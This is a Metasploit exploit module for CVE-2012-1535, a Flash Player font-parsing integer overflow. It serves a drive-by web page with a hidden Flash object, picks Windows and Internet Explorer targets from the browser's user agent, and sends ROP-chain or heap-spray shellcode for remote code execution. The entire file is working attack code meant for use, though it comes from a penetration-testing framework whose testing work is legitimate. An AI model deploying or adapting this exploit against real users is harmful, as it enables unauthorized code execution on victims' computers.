##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Adobe Flash Player 11.3 Kern Table Parsing Integer Overflow",
      'Description'    => %q{
          This module exploits a vulnerability found in the ActiveX component of Adobe
        Flash Player before 11.3.300.271. By supplying a specially crafted .otf font file
        with a large nTables value in the 'kern' header, it is possible to trigger an
        integer overflow, which results in remote code execution under the context of the
        user.  This vulnerability has also been exploited in the wild in limited targeted
        attacks.  Please note in order to ensure reliability, the exploit is forced to
        modify your URIPATH parameter to less than 3 characters, which may cause possible
        URIPATH collisions.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Alexander Gavrun', #Through iDefense
          'sinn3r',
          'juan vazquez'
        ],
      'References'     =>
        [
          [ 'CVE', '2012-1535' ],
          [ 'OSVDB', '84607'],
          [ 'BID', '55009'],
          [ 'URL', 'http://labs.alienvault.com/labs/index.php/2012/cve-2012-1535-adobe-flash-being-exploited-in-the-wild/' ],
          [ 'URL', 'https://developer.apple.com/fonts/TTRefMan/RM06/Chap6.html' ],
          [ 'URL', 'http://contagiodump.blogspot.com.es/2012/08/cve-2012-1535-samples-and-info.html' ],
          [ 'URL', 'https://www.rapid7.com/blog/post/2012/08/17/adobe-flash-player-exploit-cve-2012-1535-now-available-for-metasploit' ],
          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb12-18.html']
        ],
      'Payload'        =>
        {
          'Space' => 1024
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # Tested successfully on:
          # Flash 11.2.202.233
          # Flash 11.3.300.268
          # Flash 11.3.300.265
          # Flash 11.3.300.257
          [ 'Automatic', {} ],
          [ 'IE 6 on Windows XP SP3',    {'Rop' => nil } ],
          [ 'IE 7 on Windows XP SP3',    {'Rop' => nil } ],
          [ 'IE 8 on Windows XP SP3',    {'Rop' => true, 'ASLR' => false } ],
          [ 'IE 7 on Windows Vista SP2', {'Rop' => nil }],
          [ 'IE 8 on Windows 7 SP1',     {'Rop' => true, 'ASLR' => true } ],
          [ 'IE 9 on Windows 7 SP1',     {'Rop' => true, 'ASLR'   => true } ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => '2012-08-09',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptEnum.new('ROP', [true, "The ROP chain to use", 'SWF', %w(SWF JRE)]),
      ])
  end

  def get_payload(t, flash_version=nil)
    if t['Rop'].nil?
      p = [
        0x0c0c0c0c, # mapped at 1e0d0000
        0x0c0c0c0c,
        0x0c0c0c0c, # mapped at 1e0d0008
      ].pack("V*")

      p << payload.encoded
      return p
    end

    if t['ASLR'] == false and datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,257/
      print_status("Using Rop Chain For Flash: #{flash_version}")
      pivot = [
        0x10004171, # POP EDI # POP ESI # RETN (1e0d0000)
        0x0c0c0c0c,
        0x1001d891, # xchg eax, esp # ret (1e0d0008)
      ].pack("V*")

      p = generate_rop_payload('flash', payload.encoded, {'target'=>'11.3.300.257', 'pivot'=>pivot})

    elsif t['ASLR'] == false and datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,265/
      print_status("Using Rop Chain For Flash: #{flash_version}")
      pivot = [
        0x10004171, # POP EDI # POP ESI # RETN (1e0d0000)
        0x0c0c0c0c,
        0x1001d6d3, # xchg eax, esp # ret (1e0d0008)
      ].pack("V*")

      p = generate_rop_payload('flash', payload.encoded, {'target'=>'11.3.300.265', 'pivot'=>pivot})

    elsif t['ASLR'] == false and datastore['ROP'] == 'SWF' and flash_version =~ /11,3,300,268/
      print_status("Using Rop Chain For Flash: #{flash_version}")
      pivot = [
        0x10004171, # POP EDI # POP ESI # RETN (1e0d0000)
        0x0c0c0c0c,
        0x1001d755, # xchg eax, esp # ret (1e0d0008)
      ].pack("V*")

      p = generate_rop_payload('flash', payload.encoded, {'target'=>'11.3.300.268', 'pivot'=>pivot})

    else
      print_status("Default back to JRE ROP")
      pivot = [
        0x7c34a028, # POP EDI # POP ESI # RETN (1e0d0000)
        0x0c0c0c0c,
        0x7c348b05, # xchg eax, esp # ret (1e0d0008)
      ].pack("V*")

      p = generate_rop_payload('java', payload.encoded, {'pivot'=>pivot})
    end

    return p
  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'

    if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
      return targets[1]  #IE 6 on Windows XP SP3
    elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
      return targets[2]  #IE 7 on Windows XP SP3
    elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/
      return targets[3]  #IE 8 on Windows XP SP3
    elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
      return targets[4]  #IE 7 on Windows Vista SP2
    elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 8/
      return targets[5]  #IE 8 on Windows 7 SP1
    elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 9/
      return targets[6]  #IE 9 on Windows 7 SP1
    else
      return nil
    end
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    my_target = get_target(agent)

    # Avoid the attack if the victim doesn't have the same setup we're targeting
    if my_target.nil?
      print_error("Browser not supported: #{agent}")
      send_not_found(cli)
      return
    end

    print_status("Target selected: #{my_target.name}")
    print_status("Client requesting: #{request.uri}")

    # The SWF request itself
    if request.uri =~ /\.swf$/
      print_status("Sending SWF")
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash'})
      return
    end

    # The TXT payload request
    if request.uri =~ /\.txt$/
      flash_version = request.headers['x-flash-version']
      shellcode = get_payload(my_target, flash_version).unpack('H*')[0]
      print_status("Sending Payload")
      send_response(cli, shellcode, { 'Content-Type' => 'text/plain' })
      return
    end

    #swf_uri = get_resource() + Rex::Text.rand_text_alphanumeric(rand(8)+4) + ".swf"
    swf_uri = "/#{@resource_name}.txt.swf"

    html = %Q|
    <html>
    <head>
    </head>
    <body>
    <object width="1" height="1" type="application/x-shockwave-flash" data="#{swf_uri}">
    <param name="movie" value="#{swf_uri}">
    <param name="FlashVars" value="s=#{@resource_name}">
    </object>
    </body>
    </html>
    |

    html = html.gsub(/^ {4}/, '')

    print_status("Sending HTML")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

  def primer
    # we need to handle direct /pay.txt requests
    hardcoded_uripath("/#{@resource_name}.txt")
  end

  def exploit
    @swf = create_swf
    @resource_name = Rex::Text.rand_text_alpha(5)
    vprint_status("SWF Loaded: #{@swf.length.to_s} bytes")

    datastore['URIPATH'] = datastore['URIPATH'] || random_uri
    datastore['URIPATH'] = '/' + datastore['URIPATH'] if datastore['URIPATH'] !~ /^\//
    datastore['URIPATH'] = datastore['URIPATH'][0,3] if datastore['URIPATH'].length > 3
    print_warning("URIPATH set to #{datastore['URIPATH']}")

    super
  end

  def create_swf
    path = ::File.join( Msf::Config.data_directory, "exploits", "CVE-2012-1535", "Main.swf" )
    fd = ::File.open( path, "rb" )
    swf = fd.read(fd.stat.size)
    fd.close
    return swf
  end
end
